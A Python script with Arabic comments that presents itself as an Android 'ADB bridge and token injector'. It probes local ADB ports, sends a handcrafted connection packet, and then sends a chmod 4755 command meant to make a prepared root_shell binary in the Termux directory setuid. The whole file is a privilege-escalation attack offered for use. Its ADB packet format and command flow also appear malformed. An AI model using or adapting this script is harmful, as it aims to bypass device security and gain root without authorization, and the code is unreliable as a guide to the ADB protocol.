import socket
import struct
import sys

def print_banner():
    print("=" * 60)
    print("   Android Local ADB Bridge & Token Injector v1.0   ")
    print("=" * 60)

def trigger_local_bridge():
    # المحاولة على المنافذ الافتراضية للـ ADB وتصحيح الأخطاء في أندرويد
    # المنفذ 5555 هو القياسي، وبعض الأنظمة تستخدم منافذ أخرى ديناميكية
    target_ports = [5555, 39999, 43210] 
    localhost = "127.0.0.1"
    
    # رسالة الـ Handshake لبروتوكول ADB القديم (CNXN) للاستدعاء الخارق
    # الأندرويد قد يستجيب للطلبات المحلية إذا لم تكن الحماية محدثة بالكامل
    ADB_CONNECT_PAYLOAD = struct.pack('<IIII', 0x4e584e43, 0x01000000, 0x00001000, 0x00000000) + b"host::\x00"

    for port in target_ports:
        print(f"[*] Trying to injection local token into port {port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((localhost, port))
            
            # إرسال بايلود الاتصال المحظور
            s.send(ADB_CONNECT_PAYLOAD)
            response = s.recv(1024)
            
            if response:
                print(f"[!!!] SUCCESS: Port {port} responded to ADB Handshake!")
                print(f"      Response Hex: {response.hex()}")
                print("[*] Upgrading privileges of ./root_shell via injected stream...")
                # هنا يتم إرسال أمر رفع الصلاحيات للملف الجاهز لدينا
                s.send(b"shell:chmod 4755 /data/data/com.termux/files/home/root_shell\n")
                s.close()
                return True
            s.close()
        except socket.error:
            print(f"[-] Port {port} is tightly closed or restricted by SELinux.")
    return False

if __name__ == "__main__":
    print_banner()
    if not trigger_local_bridge():
        print("\n[-] Local ADB Briding failed. System IPC boundaries are fully locked.")
        print("[i] Notice: If 'Wireless Debugging' is available in your Huawei Developer Options, turn it ON and rerun this script.")

